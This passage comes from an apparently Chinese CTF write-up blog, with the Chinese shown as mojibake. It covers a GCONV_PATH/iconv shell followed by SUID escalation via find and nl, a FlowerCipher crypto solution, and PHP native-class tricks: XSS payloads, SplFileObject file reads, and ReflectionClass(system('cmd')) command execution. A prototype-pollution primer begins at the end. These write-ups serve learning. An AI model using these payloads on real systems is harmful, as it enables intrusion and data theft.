iconv(&quot;è‡ªå®šä¹‰å­—ç¬¦é›†å&quot;, &quot;UTF-8&quot;, &quot;whatever&quot;);?&gt;</code></pre><p>æˆ‘ä»¬å°±ç›´æ¥ä¼ å‚</p><pre class="language-none"><code class="language-none">a&#x3D;putenv(&quot;GCONV_PATH&#x3D;&#x2F;tmp&#x2F;&quot;);include(&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.a.utf-8&#x2F;resource&#x3D;&#x2F;tmp&#x2F;a.so&#39;);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331205203233.png" alt="image-20220331205203233"></p><p>shellå¼¹å‡ºæ¥äº†</p><p>ä½†æ˜¯è¦è®¿é—®flagæ–‡ä»¶æƒé™ä¸å¤Ÿ</p><p>suidææƒ<a href="http://t.zoukankan.com/appear001-p-12059158.html">Linuxææƒ-suidææƒ - èµ°çœ‹çœ‹ (zoukankan.com)</a></p><p>find / -user root -perm -4000 -print 2&gt;/dev/null</p><p>è¿™æ­¥ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘æ²¡æœ‰å¤ç°æˆåŠŸï¼Œåªè¾“å‡ºäº†ä¸‰ä¸ªå€¼å°±å¡ä½äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331205416767.png" alt="image-20220331205416767"></p><p>ä½†æ˜¯å¯ä»¥ç”¨åˆ«çš„å‘½ä»¤çœ‹çœ‹</p><pre class="language-bash" data-language="bash"><code class="language-bash">find &#x2F;bin -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F;usr -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331205820325.png" alt="image-20220331205820325"></p><p>æœ€åå°±æ˜¯çœ‹åˆ°nlæœ‰æƒé™ï¼Œç”¨nlè¯»å–flagå°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331205546901.png" alt="image-20220331205546901"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="æœˆåœ†ä¹‹å¤œ"><a href="#æœˆåœ†ä¹‹å¤œ" class="headerlink" title="æœˆåœ†ä¹‹å¤œ"></a>æœˆåœ†ä¹‹å¤œ</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331214556905.png" alt="image-20220331214556905"></p><p><a href="https://www.bilibili.com/video/BV1rL4y1T7fb?spm_id_from=333.337.search-card.all.click">æˆ‘ç ´è¯‘äº†ç¥çº§å½©è›‹ï¼è¿™æ¬¾æ¸¸æˆç«Ÿç„¶è—äº†è¿™ä¹ˆå¤šå‰§æƒ…ï¼Ÿã€Šæœˆåœ†ä¹‹å¤œã€‹ç©¶ç«Ÿè®²äº†ä»€ä¹ˆæ•…äº‹ï¼Ÿ_å•æœºæ¸¸æˆçƒ­é—¨è§†é¢‘ (bilibili.com)</a></p><p>Bç«™æœ‰è§£å¯†çš„ï¼Œå¯¹ç€æ‰¾å°±è¡Œ</p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="FlowerCipher"><a href="#FlowerCipher" class="headerlink" title="FlowerCipher"></a>FlowerCipher</h2><pre class="language-none"><code class="language-none"># python3from secret import flagimport random# flag &#x3D; b&#39;flag&#123;%s&#125;&#39; % md5(something).hexdigest()# note that md5 only have characters &#39;abcdef&#39; and digitsdef Flower(x, key):    flower &#x3D; random.randint(0, 4096)    return x * (key ** 3 + flower)flag &#x3D; flag[5:-1]rounds &#x3D; len(flag)L, R &#x3D; 1, 0for i in range(rounds):    L, R &#x3D; R + Flower(L, flag[i]), Lprint(L, R)&#39;&#39;&#39;15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003&#39;&#39;&#39;</code></pre><p>åŠ å¯†æ–¹å¼å°±æ˜¯æŠŠflagçš„å­—ç¬¦è½¬æˆmd5ç„¶åå†è½¬æˆasciiç åå¥—åœ¨Flowerå‡½æ•°é‡Œè®¡ç®—ï¼Œç„¶åå¯¹RLé‡æ–°èµ‹å€¼ï¼Œè¿™æ ·çš„Rå…¶å®å°± æ˜¯å‰ä¸€ä¸ªLçš„å€¼ï¼Œè€Œå®é™…ä¸ŠL = ä¸Šä¸€ä¸ªR + ä¸Šä¸€ä¸ªLä¹˜ä¸Š(key ** 3 + flower)ï¼Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220331215625510.png" alt="image-20220331215625510"></p><p>æ˜¾ç„¶ L1 * (key ** 3 + flower)æ˜¯èƒ½è¢«L1æ•´é™¤çš„ï¼Œè€ŒR1ä¸è¡Œ</p><p>æ‰€ä»¥L2/L1çš„ä½™æ•°å°±æ˜¯L2</p><p>è¿™æ ·æˆ‘ä»¬å¯ä»¥å¾—åˆ°æ‰€æœ‰çš„Lå’ŒR</p><pre class="language-none"><code class="language-none">R &#x3D; &#123;0: 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003, 1: 935298420671754230833014738849730432588169238033228173469583131476419084794695511761146278309606770027490667271610796624269392034586175088396235641537756093736185366, 2: 7402968320895532116930768370098929764678065093602516751185225609968053961398195671796668035067389408306736179462173593882795916384659802649189800851665219198361, 3: 41491807647864532203061547188977816042392604608090542687445179257686072390683442091157724792609311622180322599523073162631870961894947012137520634996058265, 4: 363542281260527120641507826394376579427002124891256726811704925452455933892306777570036028677323021255266880206017499363363356743613369155668503557061, 5: 3038050870004975946934828279229998090001629942971672705946371743686684953534372767609080560274203027849883925292484330032865963662762987021572213, 6: 3121683903445470016877317983137081025437455800044243487676152297523129079630621593231064333666220053742946978640516933836161839706107832842, 7: 16713517279670522179142602316669021266414545548551242366498025076135157482269671171234675566764239156725485371108735804221489129242235, 8: 17728566345779292838907909381612640668036643431117165902908905722221490552536570008262521006387722966311695266888986102760148482, 9: 18822751726365286700612339826340137082689797360168751039458371318582478795225200597245268849966216725478600774872948579145, 10: 19346619488865481717482094100686681292384530125288986759529832156605546935716879938892385301891033660176897469426477, 11: 19304497076225869711849746340455541612339463403087957113496859433662333338211557279788474751973335123601723351, 12: 19287157921091613716265688246942013055491723611322575658962386161345041119412098008892719335475158074595, 13: 163194634853135239779527687110852732238802459017066087158243026833107794785760861815584881897662446, 14: 973825402922208545745882895848854992390620148165434035074196392656950555217820068399921894085, 15: 6028609474886885541605763758989943967354486126474121155263363791803356933057570965004061, 16: 5830376668137452804173383567980586211563348379884185911787096393298400138955904511, 17: 32759342090485149698017824597983901673872922475506121132811189377165700630061, 18: 241267801518963217329803327254141129383508497053892152707957403620167975, 19: 240324048977128823416619126180138745528644638124733113619292984561, 20: 1501209023627137765492979001172871435243212151481455508796928, 21: 11731219952144596819377276074864534430521345582519171825, 22: 11050144307727113700681557772687121323224647867153, 23: 10722465754210488857842384539746544074196670, 24: 67952303343509961405922862120527631953, 25: 424678007756192434300006917804988, 26: 449366186013055209469307061, 27: 2694478038943586736328, 28: 24316418691677517, 29: 137492755075, 30: 133317, 31: 1, 32: 0&#125;L &#x3D; &#123;0: 15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899, 1: 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003, 2: 935298420671754230833014738849730432588169238033228173469583131476419084794695511761146278309606770027490667271610796624269392034586175088396235641537756093736185366, 3: 7402968320895532116930768370098929764678065093602516751185225609968053961398195671796668035067389408306736179462173593882795916384659802649189800851665219198361, 4: 41491807647864532203061547188977816042392604608090542687445179257686072390683442091157724792609311622180322599523073162631870961894947012137520634996058265, 5: 363542281260527120641507826394376579427002124891256726811704925452455933892306777570036028677323021255266880206017499363363356743613369155668503557061, 6: 3038050870004975946934828279229998090001629942971672705946371743686684953534372767609080560274203027849883925292484330032865963662762987021572213, 7: 3121683903445470016877317983137081025437455800044243487676152297523129079630621593231064333666220053742946978640516933836161839706107832842, 8: 16713517279670522179142602316669021266414545548551242366498025076135157482269671171234675566764239156725485371108735804221489129242235, 9: 17728566345779292838907909381612640668036643431117165902908905722221490552536570008262521006387722966311695266888986102760148482, 10: 18822751726365286700612339826340137082689797360168751039458371318582478795225200597245268849966216725478600774872948579145, 11: 19346619488865481717482094100686681292384530125288986759529832156605546935716879938892385301891033660176897469426477, 12: 19304497076225869711849746340455541612339463403087957113496859433662333338211557279788474751973335123601723351, 13: 19287157921091613716265688246942013055491723611322575658962386161345041119412098008892719335475158074595, 14: 163194634853135239779527687110852732238802459017066087158243026833107794785760861815584881897662446, 15: 973825402922208545745882895848854992390620148165434035074196392656950555217820068399921894085, 16: 6028609474886885541605763758989943967354486126474121155263363791803356933057570965004061, 17: 5830376668137452804173383567980586211563348379884185911787096393298400138955904511, 18: 32759342090485149698017824597983901673872922475506121132811189377165700630061, 19: 241267801518963217329803327254141129383508497053892152707957403620167975, 20: 240324048977128823416619126180138745528644638124733113619292984561, 21: 1501209023627137765492979001172871435243212151481455508796928, 22: 11731219952144596819377276074864534430521345582519171825, 23: 11050144307727113700681557772687121323224647867153, 24: 10722465754210488857842384539746544074196670, 25: 67952303343509961405922862120527631953, 26: 424678007756192434300006917804988, 27: 449366186013055209469307061, 28: 2694478038943586736328, 29: 24316418691677517, 30: 137492755075, 31: 133317, 32: 1&#125;</code></pre><p>ç„¶åå†ç”¨(L[i]-R[i+1])//L[i+1]æ±‚å‡ºflag[i]**3 + flowerçš„å€¼</p><pre class="language-none"><code class="language-none">FLAG &#x3D; &#123;0: 112511, 1: 149387, 2: 126341, 3: 178420, 4: 114132, 5: 119663, 6: 973209, 7: 186776, 8: 942745, 9: 941869, 10: 972922, 11: 1002182, 12: 1000899, 13: 118185, 14: 167581, 15: 161534, 16: 1034000, 17: 177976, 18: 135780, 19: 1003927, 20: 160087, 21: 127967, 22: 1061635, 23: 1030560, 24: 157794, 25: 160009, 26: 945060, 27: 166773, 28: 110809, 29: 176856, 30: 1031322, 31: 133317&#125;</code></pre><p>ç”±äº1çš„asciiçš„ä¸‰æ¬¡æ–¹å’Œ2çš„asciiç ä¹‹é—´çš„å·®å€¼ä¹Ÿè¦æ¯”æœ€å¤§çš„flowerå¤§ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥éå†ä¸€ä¸‹</p><p>å¾—åˆ°flagå€¼</p><pre class="language-python" data-language="python"><code class="language-python">FLAG &#x3D; &#123;0: 112511, 1: 149387, 2: 126341, 3: 178420, 4: 114132, 5: 119663, 6: 973209, 7: 186776, 8: 942745, 9: 941869, 10: 972922, 11: 1002182, 12: 1000899, 13: 118185, 14: 167581, 15: 161534, 16: 1034000, 17: 177976, 18: 135780, 19: 1003927, 20: 160087, 21: 127967, 22: 1061635, 23: 1030560, 24: 157794, 25: 160009, 26: 945060, 27: 166773, 28: 110809, 29: 176856, 30: 1031322, 31: 133317&#125;flag &#x3D; &#39;&#39;for i in range(32):    #FLAG[i] &#x3D; (L[i]-R[i+1])&#x2F;&#x2F;L[i+1]    for j in range(48,123):        if j**3 &lt;&#x3D; FLAG[i] and (j+1)**3 &gt; FLAG[i]:            flag +&#x3D; chr(j)        else:            continueprint(&#39;flag&#x3D;&#39;+flag[::-1])&#x2F;&#x2F;3e807b66ef26d38e671ddcbb9c108250</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»ä¸€é“ctfé¢˜çœ‹phpåŸç”Ÿç±»</title>
      <link href="/2022/02/25/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9C%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
      <url>/2022/02/25/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9C%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p>è¿™æ˜¯ctfshowçš„ä¸€é“æ¯”èµ›é¢˜</p><p>å…ˆæ¥çœ‹çœ‹æºç </p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);if(isset($_GET[&#39;source&#39;]))&#123;    highlight_file(__FILE__);    echo &quot;\$flag_filename &#x3D; &#39;flag&#39;.md5(???).&#39;php&#39;;&quot;;    die();&#125;if(isset($_POST[&#39;a&#39;]) &amp;&amp; isset($_POST[&#39;b&#39;]) &amp;&amp; isset($_POST[&#39;c&#39;]))&#123;    $c &#x3D; $_POST[&#39;c&#39;];    $count[++$c] &#x3D; 1;    if($count[] &#x3D; 1) &#123;        $count[++$c] &#x3D; 1;        print_r($count);        die();    &#125;else&#123;        $a &#x3D; $_POST[&#39;a&#39;];        $b &#x3D; $_POST[&#39;b&#39;];        echo new $a($b);    &#125;&#125;?&gt;$flag_filename &#x3D; &#39;flag&#39;.md5(???).&#39;php&#39;;</code></pre><p>ç»•è¿‡ç¬¬äºŒä¸ªifåˆ¤æ–­æ˜¯åˆ©ç”¨äº†æ•°ç»„æº¢å‡ºçš„åŸç†</p><p>ç„¶åè¿›å…¥elseè¯­å¥</p><p>ä¸€èˆ¬çœ‹åˆ°echo new $a($b)è¿™ç§å½¢å¼ï¼Œå°±éœ€è¦è€ƒè™‘åˆ©ç”¨phpçš„åŸç”Ÿç±»æ¥éå†ç›®å½•ä»¥åŠè¯»å–æ–‡ä»¶</p><h2 id="æŠ¥é”™ç±»"><a href="#æŠ¥é”™ç±»" class="headerlink" title="æŠ¥é”™ç±»"></a>æŠ¥é”™ç±»</h2><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><p>åœ¨PHP7ç‰ˆæœ¬ä¸­ï¼Œå› ä¸ºErrorä¸­å¸¦æœ‰<code>__toString</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šå°†ä¼ å…¥ç»™<code>__toString</code>çš„å‚æ•°åŸå°ä¸åŠ¨çš„è¾“å‡ºåˆ°æµè§ˆå™¨ã€‚åœ¨è¿™ä¹ˆä¸€ä¸ªè¿‡ç¨‹ä¸­å¯èƒ½ä¼šäº§ç”ŸXSSã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226142059060.png"></p><pre class="language-none"><code class="language-none">a&#x3D;Error&amp;b&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&amp;c&#x3D;9223372036854775806</code></pre><h3 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h3><p>ä¸Errorç±»ä¼¼ï¼ŒExceptionåŒæ ·æœ‰<code>__toString</code>æ–¹æ³•ï¼Œå› æ­¤æµ‹è¯•ä»£ç å’Œä¸Šæ–¹ä¸€æ ·ï¼Œä¼ å…¥ä»¥ä¸‹payloadï¼ŒåŒæ ·å¯ä»¥XSSã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226173222714.png" alt="image-20220226173222714"></p><pre class="language-none"><code class="language-none">a&#x3D;Exception&amp;b&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&amp;c&#x3D;9223372036854775806</code></pre><h2 id="éå†ç›®å½•ç±»"><a href="#éå†ç›®å½•ç±»" class="headerlink" title="éå†ç›®å½•ç±»"></a>éå†ç›®å½•ç±»</h2><h3 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h3><p>DirectoryIteratorç±»çš„<code>__construct</code>æ–¹æ³•ä¼šæ„é€ ä¸€ä¸ªè¿­ä»£å™¨ï¼Œå¦‚æœä½¿ç”¨echoè¾“å‡ºè¯¥è¿­ä»£å™¨ï¼Œå°†ä¼šè¿”å›è¿­ä»£å™¨çš„ç¬¬ä¸€é¡¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226173809874.png" alt="image-20220226173809874"></p><p>è¿”å›äº†ä¸€ä¸ªç‚¹ï¼Œè¿™ä¸ªç‚¹ä»£è¡¨è¿™å½“å‰ç›®å½•</p><p>å¦‚æœè¦åŒ¹é…å…¶ä»–æ–‡ä»¶ï¼Œè¦åˆ©ç”¨globåè®®</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226174839331.png" alt="image-20220226174839331"></p><p>globåè®®æ”¯æŒé€šé…ç¬¦ï¼Œæ‰€ä»¥å¯¹äºä¸çŸ¥é“æ–‡ä»¶åçš„æ–‡ä»¶å¯ä»¥åˆ©ç”¨é€šé…ç¬¦è¿›è¡ŒåŒ¹é…</p><h3 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h3><p>ä¸DirectoryIteratorç±»ä¼¼ï¼Œä½†å®é™…ä½¿ç”¨æ—¶å‘ç°æœ‰äº›ä¸åŒ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226175041268.png" alt="image-20220226175041268"></p><h3 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h3><p>æ— éœ€åŠ globåè®®ï¼Œå› ä¸ºè¿™æ˜¯è‡ªå¸¦çš„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226175140543.png" alt="image-20220226175140543"></p><h2 id="è¯»å–æ–‡ä»¶ç±»"><a href="#è¯»å–æ–‡ä»¶ç±»" class="headerlink" title="è¯»å–æ–‡ä»¶ç±»"></a>è¯»å–æ–‡ä»¶ç±»</h2><h3 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h3><blockquote><p>SplFileObjectç±»ä¸ºæ–‡ä»¶æä¾›äº†ä¸€ä¸ªé¢å‘å¯¹è±¡æ¥å£</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥è¯»å–æ–‡ä»¶ï¼Œä¾‹å¦‚</p><pre class="language-none"><code class="language-none">a&#x3D;SplFileObject&amp;b&#x3D;flag.php</code></pre><p>ä½†æ˜¯ç”±äºè¿™ä¸ªç±»è¿”å›çš„æ˜¯è¿­ä»£å™¨ï¼Œæ‰€ä»¥ä¸èƒ½å®Œæ•´çš„è¯»å‡ºæ–‡ä»¶ï¼Œæ‰€ä»¥å°±è¦åˆ©ç”¨php://filteræ¥å°†æ–‡ä»¶å†…å®¹ä»¥å…¨éƒ¨è¾“å‡º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226181714890.png" alt="image-20220226181714890"></p><h2 id="å›åˆ°è¿™é“é¢˜"><a href="#å›åˆ°è¿™é“é¢˜" class="headerlink" title="å›åˆ°è¿™é“é¢˜"></a>å›åˆ°è¿™é“é¢˜</h2><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨</p><p>FilesystemIteratorã€DirectoryIteratoræˆ–GlobIteratoræ‰¾åˆ°flagæ‰€åœ¨çš„ç›®å½•ï¼Œå†ç”¨SplFileObjectè¯»å‡ºæ–‡ä»¶å†…å®¹</p><p>ä½†æ˜¯è¿™é“é¢˜ä¸­flagæ–‡ä»¶å¹¶ä¸å«flag.phpè€Œæ˜¯flag.md5(???).phpï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç”¨é€šé…ç¬¦æ‰¾åˆ°çœŸæ­£çš„flagæ–‡ä»¶ï¼Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226184433903.png" alt="image-20220226184433903"></p><p>åœ¨é€šé…ç¬¦ä¸­ï¼Œï¼Ÿä»£è¡¨ä¸€ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯å¿…é¡»å­˜åœ¨ï¼Œè€Œ*è¡¨ç¤ºå­˜åœ¨ä»»æ„ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯ä¹ŸåŒ…æ‹¬é›¶ä¸ªï¼Œæ‰€ä»¥å› ä¸ºè¿­ä»£å™¨çš„æ€§è´¨ï¼ŒåªåŠ *å°±åªèƒ½åŒ¹é…åˆ°flag.php</p><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç”¨FilesystemIteratorï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åŠ è·¯å¾„çœ‹åˆ°è¿™ä¸ªflagæ–‡ä»¶ï¼Œä¸å¤ªç†è§£ä¸ºä»€ä¹ˆ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226184809317.png" alt="image-20220226184809317"></p><p>æ¥ä¸‹æ¥å°±æ˜¯ç”¨SplFileObjectè¯»å‡ºæ¥å°±ç„¶åbase64è§£ä¸ªç å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226185100750.png" alt="image-20220226185100750"></p><h2 id="åå°„ç±»è·å–æ³¨é‡Š"><a href="#åå°„ç±»è·å–æ³¨é‡Š" class="headerlink" title="åå°„ç±»è·å–æ³¨é‡Š"></a>åå°„ç±»è·å–æ³¨é‡Š</h2><p>çœ‹è§è¿™ä¸ªæƒ³èµ·äº†å»å¹´å›½èµ›æˆ‘å”¯ä¸€å‡ºäº†çš„ä¸€é“é¢˜</p><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__file__);class User&#123;    private static $c &#x3D; 0;    function a()    &#123;        return ++self::$c;    &#125;    function b()    &#123;        return ++self::$c;    &#125;    function c()    &#123;        return ++self::$c;    &#125;    function d()    &#123;        return ++self::$c;    &#125;        &#x2F;**         * flag         *&#x2F;    function e()    &#123;        return ++self::$c;    &#125;    function f()    &#123;        return ++self::$c;    &#125;    function g()    &#123;        return ++self::$c;    &#125;    function h()    &#123;        return ++self::$c;    &#125;    function i()    &#123;        return ++self::$c;    &#125;    function j()    &#123;        return ++self::$c;    &#125;    function k()    &#123;        return ++self::$c;    &#125;    function l()    &#123;        return ++self::$c;    &#125;    function m()    &#123;        return ++self::$c;    &#125;    function n()    &#123;        return ++self::$c;    &#125;    function o()    &#123;        return ++self::$c;    &#125;    function p()    &#123;        return ++self::$c;    &#125;    function q()    &#123;        return ++self::$c;    &#125;    function r()    &#123;        return ++self::$c;    &#125;    function s()    &#123;        return ++self::$c;    &#125;    function t()    &#123;        return ++self::$c;    &#125;&#125;$rc&#x3D;$_GET[&quot;rc&quot;];$rb&#x3D;$_GET[&quot;rb&quot;];$ra&#x3D;$_GET[&quot;ra&quot;];$rd&#x3D;$_GET[&quot;rd&quot;];$method&#x3D; new $rc($ra, $rb);var_dump($method-&gt;$rd());</code></pre><p>flagåœ¨æ³¨é‡Šé‡Œä½†å¹¶ä¸ä¼šè¢«æ˜¾ç¤ºå‡ºæ¥ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨é€šè¿‡åå°„ ReflectionMethod ç±»æ¥è·å–ç±»æ–¹æ³•çš„ç›¸å…³ä¿¡æ¯</p><pre class="language-text" data-language="text"><code class="language-text">?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;e&amp;rd&#x3D;getDocComment</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226193319167.png" alt="image-20220226193319167"></p><p>ç›´æ¥æŸ¥çœ‹ç±»å¯ä»¥ç”¨ReflectionClass</p><p>åå°„ç±»ä¸ä»…ä»…å¯ä»¥å»ºç«‹å¯¹ç±»çš„æ˜ å°„ï¼Œä¹Ÿå¯ä»¥<strong>å»ºç«‹å¯¹PHPåŸºæœ¬æ–¹æ³•çš„æ˜ å°„</strong>ï¼Œå¹¶ä¸”è¿”å›åŸºæœ¬æ–¹æ³•æ‰§è¡Œçš„æƒ…å†µã€‚å› æ­¤å¯ä»¥é€šè¿‡å»ºç«‹åå°„ç±»<code>new ReflectionClass(system(&#39;cmd&#39;))</code>æ¥æ‰§è¡Œå‘½ä»¤</p>]]></content>
      
      
      
        <tags>
            
            <tag> webå­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jsæ¼æ´</title>
      <link href="/2022/02/21/js%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/02/21/js%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h1><h2 id="æ·±å…¥äº†è§£JavaScript"><a href="#æ·±å…¥äº†è§£JavaScript" class="headerlink" title="æ·±å…¥äº†è§£JavaScript"></a>æ·±å…¥äº†è§£JavaScript</h2><p>åœ¨JavaScriptä¸­ï¼Œä¸€åˆ‡çš†å¯¹è±¡</p><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªjså¯¹è±¡å¦‚</p><pre class="language-none"><code class="language-none">var a &#x3D; &#123;&#125;;</code></pre><p>å®ƒä¼šæ‹¥æœ‰ä¸€äº›è‡ªå¸¦çš„å±æ€§ï¼Œå¦‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221163610282.png" alt="image-20220221163610282"></p><p>JavaScriptä¸­ï¼Œæˆ‘ä»¬å¦‚æœè¦å®šä¹‰ä¸€ä¸ªç±»ï¼Œéœ€è¦ä»¥å®šä¹‰â€œæ„é€ å‡½æ•°â€çš„æ–¹å¼æ¥å®šä¹‰ï¼š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221163750576.png" alt="image-20220221163750576"></p><p>è¿™é‡Œtest()å‡½æ•°çš„å†…å®¹å…¶å®å°±æ˜¯testç±»çš„æ„é€ å‡½æ•°</p><p>è€Œ<strong>constructor</strong>è¿™ä¸ªå±æ€§å°±æ˜¯ç”¨äºæŸ¥çœ‹å¯¹è±¡çš„æ„é€ å‡½æ•°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221164147637.png" alt="image-20220221164147637"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è¦çŸ¥é“<strong>prototype</strong>å’Œ**__proto__**åˆæ˜¯ä»€ä¹ˆ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/787416-20160323103557261-114570044.png" alt="img"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/787416-20160323103622089-1134417169.png" alt="img"></p><p>ä»ç±»çš„è§’åº¦è®²ï¼Œ<code>prototype</code>æ˜¯å…¶ä¸€ä¸ªå±æ€§ï¼Œæ‰€æœ‰ç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œéƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ã€‚ä½†æ˜¯ç±»æ‰€å®ä¾‹åŒ–çš„å¯¹è±¡å¹¶ä¸èƒ½é€šè¿‡prototypeè®¿é—®åŸå‹ï¼Œæ‰€ä»¥æ‰æœ‰<code>__proto__</code>å‡ºç°ï¼Œä¸”ä¸€ä¸ªå¯¹è±¡çš„<strong>proto</strong>å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨çš„ç±»çš„prototypeå±æ€§ã€‚</p><p>è¿™ä¸ªç‰¹æ€§è¢«ç”¨äºå®ç°JavaScriptä¸­çš„ç»§æ‰¿æœºåˆ¶ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬å®šä¹‰çš„aæœ‰ toString() å±æ€§ï¼Ÿè¿™æ­£æ˜¯ç»§æ‰¿æœºåˆ¶çš„ä½œç”¨ã€‚</p><p>å¯¹äºaè€Œè¨€æœ‰ä¸ª__proto__å±æ€§æŒ‡å‘window.Object.prototype</p><p>è¿™æ ·ä½ åœ¨è°ƒç”¨a.toString() çš„æ—¶å€™ï¼Œaæœ¬èº«æ²¡æœ‰ toStringï¼Œå°±å» a.__proro__ ä¸Šé¢å»æ‰¾ toStringã€‚</p><p>æ‰€ä»¥ä½ è°ƒç”¨ a.toString çš„æ—¶å€™ï¼Œå®é™…ä¸Šè°ƒç”¨çš„æ˜¯ window.Object.prototype.toString</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221172804302.png" alt="image-20220221172804302"></p><p>å¯¹äºpç¥çš„ä¾‹å­æˆ‘çš„ç†è§£æ˜¯å¯¹Fooç±»çš„çˆ¶ç±»æ·»åŠ 